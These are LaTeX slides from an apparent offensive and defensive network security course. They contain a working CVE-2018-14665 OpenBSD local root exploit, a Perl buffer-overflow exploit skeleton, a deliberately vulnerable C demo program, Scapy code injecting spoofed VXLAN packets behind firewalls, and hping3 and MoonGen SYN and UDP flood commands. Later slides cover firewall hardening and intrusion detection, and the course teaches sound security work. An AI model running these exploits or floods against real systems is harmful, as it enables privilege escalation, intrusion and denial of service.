\slide{Overflow -- segmentation fault}

\hlkimage{18cm}{buffer-overflow-2.pdf}


\begin{list2}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list2}


\slide{Exploits -- abusing a vulnerability}

\begin{alltt}\footnotesize
$buffer = "";
$null = "\textbackslash{}x00";
$nop = "\textbackslash{}x90";
$nopsize = 1;
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0x01101d48; // address where shellcode is
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}
$address = pack('l', $the_shell_pointer);
$buffer .= $address;
exec "$program", "$buffer";
\end{alltt}

\begin{list2}
\item Exploit/exploit program are designed to exploit a specific vulnerability, often a specific version on a specific release on a specific CPU architecture
\item Might be a 5 line program written in Perl, Python or a C program
\item Today we often see them as modules written for Metasploit allowing it to be combined with different payloads
\end{list2}

\slide{Kali virtual machine -- working with buffer overflow}

\hlkimage{15cm}{kali-buffer-overflow-demo-32-64.png}


\begin{list2}
\item Example screenshot from a session with a small vulnerable program
\item Notice the hex return address ends in 4343 which are the characters/bytes sent as "CC"
\end{list2}



\slide{CVE-2018-14665 Multiple Local Privilege Escalation}

\begin{alltt}\footnotesize
#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root.
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
 -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back
echo [+] type 'Password1' and hit enter for root
su -
\end{alltt}
Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}

\begin{list2}
\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}

%\item Example exploit method, write cron job - wait for shell:\\
%\url{https://www.exploit-db.com/exploits/45742}
\end{list2}


\slide{Example Linux Kernel Vulnerabilities}

The Linux kernel has had some vulnerabilities over the years:\\
This link is for: Linux » Linux Kernel : Security Vulnerabilities (CVSS score >= 9)\\

{\footnotesize\url{https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-9/cvssscoremax-/Linux-Linux-Kernel.html}}

Linux Kernel 2308 vulnerabilities from 1999 to 2019\\
\url{https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33}

\slide{Linux Kernel Fuzzing}

\begin{list2}
\item CVE-2016-0758 Integer overflow in lib/asn1\_decoder.c in the Linux kernel before 4.6 allows local users to gain privileges via crafted ASN.1 data.\\
\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0758}
\item Linux kernel have about 5 ASN.1 parsers\\
\url{https://www.x41-dsec.de/de/lab/blog/kernel_userspace/}
\end{list2}



\slide{How to find these buffer overflows }

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source read and analyze the code -- tools exist
\item Trial and error -- fuzzing inputs to a program, save crashes, analyze them
\item Reverse engineer specific updates, so this part was changed, nice -- this is where the bug is
\end{list1}


\slide{Principle of Least Privilege}

\begin{list1}
\item Many programs need privileges to perform some function, but sometimes they don't really need it
\item {\bf Definition 14-1} The \emph{principle of least privilege} states that a subject should be given only those privileges that it needs in order to complete the task.\\
Source:  \emph{Computer Security: Art and Science}, 2nd edition, Matt Bishop

\item Also drop privileges when not needed anymore, relinquish rights immediately
\item Example, need to read a document - but not write.
\item Database systems can often provide very fine grained access to data
\end{list1}

\slide{Privilege Escalation}
\begin{list1}
\item {\bfseries Privilege escalation} is when a privileged program is vulnerable and can be abused to escalate privileges. Example from unauthenticated user to a user account, or from regular user and becoming administrator (root on Unix) or even SYSTEM on Windows.
\item Kernels and drivers are also often susceptible to this
\end{list1}

\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote} exploit describe if the attack is done over some network, or locally on a system
\item {\bfseries Remote root exploit}
are the worst kind, since they work over the network, and gives complete control aka root on Unix
\item {\bfseries Zero-day exploits} is a term used for those exploits that suddenly pop up, without previous warning. Often found during incident response at some network. We prefer that security researchers that discover a vulnerability uses a {\bf responsible disclosure} process that involves the vendor .
\end{list1}




\slide{Insecure programming buffer overflows 101}


\begin{list2}
\item Small demo program \verb+demo.c+, try on older Linux
\item Has built-in shell code
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
the_shell()
\{  system("/bin/sh");  \}
\end{alltt}


\slide{GDB GNU Debugger}

\begin{list1}
\item GNU compiler and debugger are OK for this, can fit on a slide!
\item Lots of other debuggers exist
\item Try \verb+gdb ./demo+ and run the program with some input from the \emph{gdb prompt}
using \verb+run 1234+
\item When you realize the input overflows the buffer, crashed program execution you can work towards getting the address from \verb+nm demo+ of the function \verb+the_shell+
   -- and into the program
\item Use: \verb+nm demo | grep shell+
\item The art is to generate a string long enough to overflow, and having the correct data, so the address ends up in the right place
\item Perl be used for generating AA...AAA like this, with back ticks, \verb+`perl -e "print 'A'x10"`+
\end{list1}


\slide{Debugging af C med GDB}

\begin{list1}
\item Test with input
\begin{list2}
\item \verb+./demo longstringwithalotofdatyacrashtheprogram+
\item \verb+gdb demo+ followed by\\
\verb+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+

\item Compile program: \verb+gcc -o demo demo.c+
\item Run program \verb+./demo 123456...7689+ until it dies
\item Then retry in GDB
\end{list2}
\end{list1}


\slide{GDB output}
Pentest I – Introduktion og basale metoder
\begin{alltt} \footnotesize
hlk@bigfoot:demo$ gdb demo
GNU gdb 5.3-20030128 (Apple version gdb-330.1) (Fri Jul 16 21:42:28 GMT 2004)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "powerpc-apple-darwin".
Reading symbols for shared libraries .. done
(gdb) {\bf run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
Starting program: /Volumes/userdata/projects/security/exploit/demo/demo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols for shared libraries . done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal EXC_BAD_ACCESS, Could not access memory.
{\bf 0x41414140} in ?? ()
(gdb)
\end{alltt}



\slide{The Exploit Database -- dagens buffer overflow}

\hlkimage{13cm}{exploit-db.png}

\centerline{\link{http://www.exploit-db.com/}}


\slide{Recap before going into -- Advanced hacking}

%\hlkimage{}{}

\begin{quote}

\end{quote}

\begin{list1}
\item We have covered a lot of basic stuff, very quickly
\item Hopefully enough to get you started
\begin{list2}
\item Download Kali Linux, along with KLR Guide, and install VM
\item Start by running Nmap and scripts with Zenmap
\item Go through the Metasploit Unleashed course, if you like exploits
\item Look into wireless hacking, if you like
\item You should soon be able to look into other hacking tools and try them out. Start looking at most popular tools -- which have the best documentation
\end{list2}
\end{list1}

We didn't cover any web hacking, perhaps try:
\begin{alltt}
  nikto -host www.zencurity.com -port 443
\end{alltt}



\slide{Scapy VXLAN packets }

\hlkimage{21cm}{vxlan-basic.png}

Taking an excerpt from my talk on TROOPERS19\\
{\footnotesize\link{https://github.com/kramse/security-courses/tree/master/presentations/network/vxlan-troopers19}}

\slide{Overview VXLAN RFC7348 2014}

\hlkimage{18cm}{vxlan-basic.png}

How does it work?

\begin{list2}
\item Router 1 takes Layer 2 traffic, encapsulates with IP+UDP port 4789, routes
\item Router 2 receives IP+UDP+data, decapsulates, forward/switches layer 2 onto VLAN
\item Hosts 10.0.0.10 can talk to 10.0.0.20 as if they where next to each other in switch
\item Most often VLAN IEEE 802.1q involved too, but not shown
%\item Lets only consider two routers
\end{list2}

%\centerline{Quite easy to get a working lab with Linux or OpenBSD \smiley}

\slide{But what about security}

VXLAN does not by itself provide ANY security,
none, zip, nothing, nada! \\
No confidentiality. No integrity protection.

\vskip 5mm

Ways to protect:
\begin{list2}
\item Just configure the firewall, router ACL, etc - does not really work
\item Just isolate so no-one from the outside can send traffic, BCP38 please
\item Then what about from inside your data center, from partners, your servers
\end{list2}

\vskip 1cm
{\Large We currently have huge gaps in understanding these\\
issues - and missing security tool coverage}


\slide{VXLAN injection}

\hlkimage{19cm}{vxlan-basic-injection.png}

I tested using my pentest server in one AS, sending across an internet exchange into a production network, towards Arista testing devices - no problems, it's just routed layer 3 IP+UDP packets

\slide{Example attacks, What is possible VXLAN Header}

\begin{alltt}\footnotesize
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|R|R|R|R|I|R|R|R|            Reserved                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                VXLAN Network Identifier (VNI) |   Reserved    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
Inner Ethernet Header:
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|             Inner Destination MAC Address                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Inner Destination MAC Address | Inner Source MAC Address      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                Inner Source MAC Address                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|OptnlEthtype = C-Tag 802.1Q    | Inner.VLAN Tag Information    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
\end{alltt}

\begin{list2}
\item Inject ARP traffic, send arbitrary ARP packets to hosts, connectivity DoS
\item Inject TCP like SYN traffic behind the firewall, wire speed SYN flooding
\item Inject UDP packets and get responses sent out through firewall\\
Really anything IPv4 and IPv6 can be injected
\end{list2}


\slide{Example: Send UDP DNS reqs to inside server}

\hlkimage{20cm}{vxlan-basic-injection-dns.pdf}

%One interesting attack is injecting UDP packets to allow DNS\\
%requests to inside server which might not even have public IP

%\begin{enumerate}
%\item Select target: internal server, 10.0.0.10 and DNS service 53/UDP
%\item Create VXLAN packet(s): DNS request dst 10.0.0.10 UDP dport 53
%\item Source for this probe is your external pentest server
%\item Make sure inside packet has Ethernet destination that reaches server
%\item Send spoofed VXLAN packet across internet
%\item After VXLAN decap this packet is sent to the server
%\item Server process DNS request, send back response
%\item Attacker waiting for the UDP DNS reply, gets it
%\end{enumerate}

{\footnotesize Attacker can send UDP DNS request to inside server on RFC1918 destination\\
Note: server has no external IP or incoming ports forwarded.\\
Tested working with Clavister with DNS UDP probes/requests, no inspection }


\slide{Snippets of Scapy}

First create VXLAN header and inside packet
\begin{minted}[fontsize=\small]{python}
vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
vni=37             # Usually VNI == destination VLAN
vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
   UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,flags="Instance")
broadcastmac="ff:ff:ff:ff:ff:ff"
randommac="00:51:52:01:02:03"
attacker="185.27.115.666"
destination="10.0.0.10"
# port is the one we want to contact inside the firewall
insideport=53
testport=54040
packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
    dst=destination)/UDP(sport=testport,dport=insideport)/
    DNS(rd=1,id=0xdead,qd=DNSQR(qname="www.wikipedia.org"))
\end{minted}

{\footnotesize Fun fact, Unbound on OpenBSD reply to DNS requests received in Ethernet packets with broadcast destination and IP destination being the IP of the server}



\slide{Send and receive - from another source}

Send and then wait for something, not from same IP bc from\\
inside NAT, but port should be OK
\begin{minted}[fontsize=\small]{python}
pid = os.fork()
if pid:
    print "parent: setting up sniffing"
    # Wait for UDP packet
    data = sniff(filter="udp and port 54040 and net 192.0.2.0/24", count=1)
else:
    time.sleep(10)
    print "child: sending packet"
    sendp(packet,loop=0)
    print "child: closing"
    sys.exit(0)
data[0].show()
\end{minted}

Source port in the inside request packet, becomes the destination port in replies from the server - 54040

\slide{Packet generators}

\hlkimage{3cm}{penguinping.jpg}


\begin{list2}
\item Scapy is an example packet generator, allowing you to use Python
\item It is very flexible and often \emph{fast enough}, but other times, not fast enough
\item Lots of other tools exist, some work as kernel modules even
\item I love hping3 and t50 -- and use them for stress testing firewalls and devices
\item Started building a replacement or \verb+penguinping+
\end{list2}
\centerline{\Large $\heartsuit$ love internet packets $\heartsuit$}


\slide{hping3 packet generator}

\begin{alltt}\footnotesize
usage: hping3 host [options]
  -i  --interval  wait (uX for X microseconds, for example -i u1000)
      --fast      alias for -i u10000 (10 packets for second)
      --faster    alias for -i u1000 (100 packets for second)
      --flood	   sent packets as fast as possible. Don't show replies.
...
hping3 is fully scriptable using the TCL language, and packets
can be received and sent via a binary or string representation
describing the packets.
\end{alltt}

\begin{list2}
\item Hping3 packet generator is a very flexible tool to produce simulated DDoS traffic with specific charateristics
\item Home page: \link{http://www.hping.org/hping3.html}
\item Source repository \link{https://github.com/antirez/hping}
\end{list2}

\centerline{My primary DDoS testing tool, easy to get specific rate pps}


\slide{t50 packet generator}


\begin{alltt}\footnotesize
root@cornerstone03:~# t50 -?
T50 Experimental Mixed Packet Injector Tool 5.4.1
Originally created by Nelson Brito <nbrito@sekure.org>
Maintained by Fernando Mercês <fernando@mentebinaria.com.br>

Usage: T50 <host> [/CIDR] [options]

Common Options:
    --threshold NUM        Threshold of packets to send     (default 1000)
    --flood                This option supersedes the 'threshold'
...
6. Running T50 with '--protocol T50' option, sends ALL protocols sequentially.
root@cornerstone03:~# t50 -? | wc -l
264
\end{alltt}

\begin{list2}
\item T50 packet generator, another high speed packet generator
can easily overload most firewalls by producing a randomized traffic with multiple protocols like IPsec, GRE, MIX \\
home page: \link{http://t50.sourceforge.net/resources.html}
\end{list2}

\centerline{Extremely fast and breaks most firewalls when flooding, easy 800k pps/400Mbps}


\slide{Running full port scan on network}


Hint: use a variable to keep the target address, carefully enter it and avoid mystyping it later
\begin{alltt}
\small
# export {\bfseries CUST_NET4="192.0.2.0/24"}
# export CUST_NET6="2001:DB8:ABCD:1000::/64"
# nmap -p 1-65535 -Pn -A -oA full-scan {\bfseries $CUST_NET4}

# export CUST_IP=192.0.2.138
# date;time hping3 -q -c 1000000  -i u60 -S -p 80 $CUST_IP
\end{alltt}

Better yet, script it all -- but most likely you will want to repeat specific steps.

\slide{Nmap port sweep for TCP services, full TCP scan }

Goal is to enumerate the ports that are allowed through the network.
\begin{alltt}\small
#{\bfseries  nmap -Pn -A -p 1-65535 -oA full-tcp-customer-ipv4 $CUST_NET4}
...
Nmap scan report for 192.0.2.138
Host is up (0.00012s latency).
PORT    STATE  SERVICE
{\color{darkgreen}80/tcp  open   http}
443/tcp closed https
#{\bfseries  nmap -Pn -A -p 1-65535 -oA full-tcp-customer-ipv6 $CUST_NET6}
#{\bfseries  nmap -Pn -A -p 1-65535 -oA full-tcp-linknet-ipv4 $LINK_NET4}
#{\bfseries  nmap -Pn -A -p 1-65535 -oA full-tcp-linknet-ipv6 $LINK_NET6}
\end{alltt}

Note: Pretty harmless, if something dies, then it is
\emph{vulnerable to normal traffic} - and should be fixed!

\begin{alltt}\scriptsize
Options:
-Pn -- Scan all IPs, dont use ping or TCP ping to check alive    -A advanced -- perform full TCP connection and grab banner
-p 1-65535 -- full portscan all ports  -oA filename -- Saves output in "all formats" normal, XML, and grepable formats
\end{alltt}



\slide{Running Attacks with hping3}

\begin{alltt}\small
# export CUST_IP=192.0.2.1
# date;time hping3 -q -c 1000000  -i u60 -S -p 80  $CUST_IP
\end{alltt}

Expected output:
\begin{alltt}\small
# date;time hping3 -q -c 1000000  -i u60 -S -p 80  $CUST_IP
Thu Jan 21 22:37:06 CET 2016
HPING 192.0.2.1 (eth0 192.0.2.1): S set, 40 headers + 0 data bytes

--- 192.0.2.1 hping statistic ---
1000000 packets transmitted, 999996 packets received, 1% packet loss
round-trip min/avg/max = 0.9/7.0/1005.5 ms

real	1m7.438s
user	0m1.200s
sys	0m5.444s
\end{alltt}

\vskip 1cm
\centerline{Dont forget to do a killall hping3 when done \smiley }


\slide{Rocky Horror Picture Show - 1}

\hlkimage{20cm}{smokeping-1.png}

\centerline{Really does it break from 50.000 pps SYN attack?}

\slide{Rocky Horror Picture Show - 2}

\hlkimage{20cm}{smokeping-2.png}

\centerline{Oh no 500.000 pps UDP attacks work?}

\slide{Rocky Horror Picture Show - 3}

\centerline{Oh no spoofing attacks work?}

\hlkimage{20cm}{smokeping-3.png}

\slide{Penguingping packet generator}

\hlkimage{13cm}{penguinping-02-peak.png}

\begin{list2}
\item PenguinPing packet generator, my high speed packet generator
home page: \link{https://penguinping.org}
\item First versions are only about 230 lines of Lua code and implement basic command line to replace hping3
\item Built on top of MoonGen/libmoon \link{https://github.com/emmericp/MoonGen}
\end{list2}

\centerline{Extremely fast and allows easy customization}


\slide{Running MoonGen}

\begin{alltt}\footnotesize
root@penguin01:~/projects/MoonGen# {\bfseries ./build/MoonGen ./examples/l3-tcp-syn-flood.lua 0 -d 192.0.2.138}
[INFO]  Initializing DPDK. This will take a few seconds...
EAL: Detected 16 lcore(s)
[INFO]  Found 1 usable devices:
   Device 0: 00:25:90:32:9F:F3 (Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection)
PMD: ixgbe_dev_link_status_print():  Port 0: Link Down
[INFO]  Device 0 (00:25:90:32:9F:F3) is up: 10000 MBit/s
[INFO]  Detected an IPv4 address.
...
[Device: id=0] TX: 14.88 Mpps, 7619 Mbit/s (9999 Mbit/s with framing)
[Device: id=0] TX: 14.48 Mpps, 7414 Mbit/s (9730 Mbit/s with framing)
[Device: id=0] TX: 14.88 Mpps, 7619 Mbit/s (10000 Mbit/s with framing)
\end{alltt}

\begin{list2}
\item Installed Debian Linux -- little bit of disable secure boot, RAID/AHCI settings, ...
\item After install -- tuning and enabling Hugepages
\item Clone the repository \link{https://github.com/emmericp/MoonGen} build and run
\item {\bf Note: the full 14.8Mpps is done using a single core!}
\end{list2}

\slide{Turn up and down as you please with the -r rate option}

\begin{alltt}\footnotesize
root@penguin01:~/projects/MoonGen# {\bfseries ./build/MoonGen ./examples/l3-tcp-syn-flood.lua 0 -r 5000 -d 192.0.2.138}
[INFO]  Initializing DPDK. This will take a few seconds...
EAL: Detected 16 lcore(s)
[INFO]  Found 1 usable devices:
   Device 0: 00:25:90:32:9F:F3 (Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection)
PMD: ixgbe_dev_link_status_print():  Port 0: Link Down
[INFO]  Device 0 (00:25:90:32:9F:F3) is up: 10000 MBit/s
[INFO]  Detected an IPv4 address.

[Device: id=0] TX: 9.77 Mpps, 5000 Mbit/s (6562 Mbit/s with framing)
[Device: id=0] TX: 9.68 Mpps, 4955 Mbit/s (6504 Mbit/s with framing)
[Device: id=0] TX: 9.77 Mpps, 5000 Mbit/s (6562 Mbit/s with framing)
\end{alltt}

IPv6 and UDP, replace tcp with udp in example:
\begin{alltt}\footnotesize
./build/MoonGen ./examples/l3-tcp-syn-flood.lua 0 -r 5000 -d 2001:DB8:ABCD:0053::138 -i 2001:DB8:ABCD:0053::1

./build/MoonGen ./examples/l3-udp-flood-hlk.lua 0 -r 5000 -d 2001:DB8:ABCD:0053::138 -i 2001:DB8:ABCD:0053::1
\end{alltt}


\slide{PenguinPing -- re-implementing hping3 with Lua}

\begin{alltt}\footnotesize
root@penguin01:~/projects/MoonGen# {\bfseries ./build/MoonGen ./examples/penguinping-02.lua 10.0.49.1 -a 10.1.2.3 -r 10000 -S -p 80}
[INFO]  Initializing DPDK. This will take a few seconds...
[INFO]  Found 2 usable devices:
   Device 0: 00:25:90:32:9F:F2 (Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection)
[INFO]  Device 0 (00:25:90:32:9F:F2) is up: 10000 MBit/s
TCP mode get TCP packet
IP4 10.1.2.3 > 10.0.49.1 ver 4 ihl 5 tos 0 len 46 id 0 flags 0 frag 0 ttl 64 proto 0x06 (TCP) cksum 0x0000 [-]
TCP 52049 > 80 seq# 1 ack# 0 offset 0x5 reserved 0x00 flags 0x02 [-|-|-|-|SYN|-] win 10 cksum 0x0000 urg 0 []
  0x0000:   0000 0000 0000 0025 9032 9ff2 0800 4500
  0x0010:   002e 0000 0000 4006 0000 0a01 0203 0a00
  0x0020:   3101 cb51 0050 0000 0001 0000 0000 5002
  0x0030:   000a 0000 0000 0000 0000 0000

[Device: id=0] TX: 14.88 Mpps, 7619 Mbit/s (9999 Mbit/s with framing)
[Device: id=0] TX: 14.78 Mpps, 7568 Mbit/s (9933 Mbit/s with framing)
[Device: id=0] TX: 14.88 Mpps, 7619 Mbit/s (10000 Mbit/s with framing)
\end{alltt}

\begin{list2}
\item Using Lua we can implement the same attacks from Hping3 easily
\item Only about 230 lines of Lua using MoonGen and libmoon
\item Can run at specific rate up to full 10Gbps / 14.8 Million packets per second using a single CPU core
\end{list2}


\slide{Recommendations During Test}

\begin{list2}
\item Run each test for at least 5 minutes, or even 15 minutes\\
Some attacks require some build-up before resource run out
\item Take note of any change in response, higher latency, lost probes
\item If you see a change, then re-test using the same parameters, or a little less first
\item We want to know the approximate level where it breaks
\item If you want to change environment, then wait until all scenarios are tested
\item Keep a log handy, write notes and start the session with \verb+script ddos-date-customer.log+
\item Check once in a while if you have some process running, using \verb+ps auxw | grep hping3+
\item Run multiple instances of the tools. One process might generate 800.000 pps, while two may double it. Though 10 processes might not be 10 times exactly
\end{list2}


\slide{Conclusion Pentest, DDoS and network attacks}

\hlkimage{10cm}{network-layers-2022.pdf}
~
\begin{list2}
\item You really should try testing, and investigate your existing devices
all of them
\item This is just one small part of your security posture, extra slides has my take on enterprise network security
\end{list2}

\myquestionspage




\slide{Exploit components}

\begin{list1}
\item Shellcoders Handbook  and Grayhat chapters 12-14
\item Difference between the oldest, most simple stack based overflows
\item The parts of a shell code running system calls
\item How to avoid having shell code - return into libc, calling functions
\item This will teach us why modern operating systems have multiple methods designed to remove each case of exploiting
\item Allow us to understand the next subject, Return-Oriented Programming (ROP)
\end{list1}

Recommended shell code video:\\
EXPLORING NEW DEPTHS OF THREAT HUNTING ...OR HOW TO WRITE ARM SHELLCODE IN SIX MINUTES\\
Speaker: Maria Markstedter, Azeria Labs\\
\link{https://www.youtube.com/watch?v=DGJZBDlhIGU}


\slide{Return-Oriented Programming (ROP)}

\begin{list1}
\item Advanced subject Return-Oriented Programming (ROP)
\item \emph{Return-Oriented Programming:Systems, Languages, and Applications}
Ryan Roemer, Erik Buchanan, Hovav Shacam and Stefan Savage University of California, San Diego\\
\link{https://hovav.net/ucsd/dist/rop.pdf}
\item Then look into how a security oriented operating system has decided to prevent this method:
\item \emph{Removing ROP Gadgets from OpenBSD}
Todd Mortimer\\
\link{https://www.openbsd.org/papers/asiabsdcon2019-rop-paper.pdf}
\end{list1}

\slide{Setup the OWASP Juice Shop}

\begin{list1}
\item Recommmended for all developers: Try running the OWASP Juice Shop
\item This is an application which is modern AND designed to have security flaws.
\item Read more about this project at:\\
\link{https://www2.owasp.org/www-project-juice-shop/} and\\ \link{https://github.com/bkimminich/juice-shop}
\item It is recommended to buy the Pwning OWASP Juice Shop Official companion guide to the OWASP Juice Shop from https://leanpub.com/juice-shop - suggested price USD 5.99. Alternatively read online at https://pwning.owasp-juice.shop/
\item Sometimes the best method is running the Docker version
\end{list1}


\slide{Lab setup and Nmap Workshop}

\begin{list2}
\item Let says you want to do this, then go and do two things, after:
\item Prepare/finish your lab setup\\
\url{https://github.com/kramse/kramse-labs}

\item Switch to the materials found in my Nmap Workshop and perform Nmap scans\\
\url{https://github.com/kramse/security-courses/tree/master/courses/pentest/nmap-workshop}
\end{list2}



\slide{Concrete advice for enterprise networks}


\begin{list2}
\item Portscanning - start using portscans in your networks, verify how far malware and hackers can travel, and identify soft systems needing updates or isolation
\item Have separation -- anywhere, starting with organisation units, management networks, server networks, customers, guests, LAN, WAN, Mail, web, ...
\item Use Web proxies - do not allow HTTP directly except for a short allow list, \\
do not allow traffic to and from any new TLD
\item Use only your own DNS servers, create a pair of Unbound servers, \\
point your internal DNS running on Windows to these\\
Create filtering, logging, restrictions on these Unbound DNS servers\\
\link{https://www.nlnetlabs.nl/projects/unbound/about/} and also \link{https://pi-hole.net/}
\item Only allow SMTP via your own mail servers, create a simple forwarder if you must
\end{list2}

Allow lists are better than block list, even if it takes some time to do it

\slide{Capture data and logs!}


\begin{list2}
\item Run DNS query logs -- when client1 is infected with malware from domain malwareexample.com, then search for more clients i
nfected
\item Run Zeek and gather information about all HTTPS sessions -- captures certificates by default, and we can again search for
certificate related to malwareexample.com
\item Run network logging -- session logs in enterprise networks are GREAT \\
(country wide illegal logging is of course NOT)
\end{list2}

Make sure to check with employees, inform them!

\slide{DROP SOME TRAFFIC NOW}

\begin{list2}
\item Drop some traffic on the border of everything
\item Seriously do NOT allow Windows RPC across borders
\item Border here may be from regional country office back to HQ
\item Border may be from internet to internal networks
\item Block Windows RPC ports, 135, 137, 139, 445
\item Block DNS directly to internet, do not allow clients to use any DNS, fake 8.8.8.8 if you must internally
\item Block SMTP directly to internet
\item Create allow list for internal networks, client networks should not contact other client networks but only relevant server networks
\end{list2}

You DONT need to allow direct DNS towards internet, except from your own recursive DNS servers

If you get hacked by Windows RPC in 2022, you probably deserve it, sorry for being blunt

Best would be to analyze traffic and create allow lists, some internal networks to not need internet at all


\slide{Stateless firewall filter throw stuff away}


\begin{alltt}\footnotesize
hlk@MX-CPH-02> show configuration firewall filter all | no-more
/* This is a sample, better to use BGP flowspec or BGP based RTBH */
term edgeblocker \{
    from \{
        source-address \{
            84.xx.xxx.173/32;
...
            87.xx.xxx.171/32;
        \}
        destination-address \{
            192.0.2.16/28;
        \}
        protocol [ tcp udp icmp ];
    \}
    then \{
        count edge-block;
        discard;
    \}
\}
\end{alltt}{\footnotesize
Example how to do it wirespeed -- with Junos
Hint: can also leave out protocol and then it will match all protocols}


\slide{Default permit}

%\hlkimage{}{}

One of the early implementers of firewalls Marcus J. Ranum summarized in 2005 The Six Dumbest Ideas in Computer Security \link{https://www.ranum.com/security/computer_security/editorials/dumb/} which includes the always appropriate discussion about default permit versus default deny.

\begin{quote}\small {\bf
\#1) Default Permit}\\
This dumb idea crops up in a lot of different forms; it’s incredibly persistent and difficult to eradicate. Why? Because it’s so attractive. Systems based on ”Default Permit” are the computer security equivalent of empty calories: tasty, yet fattening.

The most recognizable form in which the ”Default Permit” dumb idea manifests itself is in firewall rules. Back in the very early days of computer security, network managers would set up an internet connection and decide to secure it by turning off incoming telnet, incoming rlogin, and incoming FTP. Everything else was allowed through, hence the name ”Default Permit.” This put the security practitioner in an endless arms-race with the hackers.
\end{quote}


\begin{list2}
\item Allow all current networks today on all ports for all protocols \emph{is} an allow list \\
Which tomorrow can be split into one for TCP, UDP and remaining, and measured upon
\item Measure, improve, repeat
\end{list2}



\slide{We cannot do X}

\begin{quote}
We cannot block SMTP from internal networks, since we do not know for sure if vendor X equipment needs to send the MOST important email alert at some unspecific time in the future
\end{quote}

Cool, then we can do an allow list starting today on our border firewall:
\begin{alltt}
table <smtp-exchange> \{ $exchange1 $exchange2 $exchange3 \}
table <smtp-unknown> persist file "/firewall/mail/smtp-internal-unknown.txt"
# Regular use, allowed
pass out on egress inet proto tcp from smtp-echange to any port 25/tcp
# Unknown, remove when phased out
pass out on egress inet proto tcp from smtp-internal to any port 25/tcp
\end{alltt}

Year 0 the unknown list may be 100\% of all internal networks, but new networks added to infrastructure are NOT added, so list will shrink -- evaluate the list, and compare to network logs, did networks send ANY SMTP for 1,2,3 years?

\slide{Zeek is a framework and platform}

\hlkimage{12cm}{zeek-ids.png}

\begin{quote}
While focusing on network security monitoring, Zeek provides a comprehensive platform for more general network traffic analysis as well. Well grounded in more than 15 years of research, Zeek has successfully bridged the traditional gap between academia and operations since its inception.
\end{quote}

\link{https://www.Zeek.org/}
Does useful things out of the box using more than 10.000 script lines

\slide{Suricata IDS/IPS/NSM}
\hlkimage{6cm}{suricata.png}

\begin{quote}
Suricata is a high performance Network IDS, IPS and Network Security Monitoring engine.
\end{quote}

 \link{http://suricata-ids.org/}
 \link{http://openinfosecfoundation.org}

Suricata, Zeek og DNS Capture -- it a nice world, use it!\\
{\small\link{https://github.com/kramse/security-courses/tree/master/courses/networking/suricatazeek-workshop}}



\slide{Firewall -- Another definition}

% Remove?
I am also fond of this longer and technical definition from RFC4949:
\begin{quote}
\$ firewall

      1. (I) {\bf An internetwork gateway that restricts data communication
      traffic to and from one of the connected networks} (the one said to
      be "inside" the firewall) and thus protects that network's system
      resources against threats from the other network (the one that is
      said to be "outside" the firewall). (See: guard, security
      gateway.)

      2. (O) {\bf A device or system that controls the flow of traffic
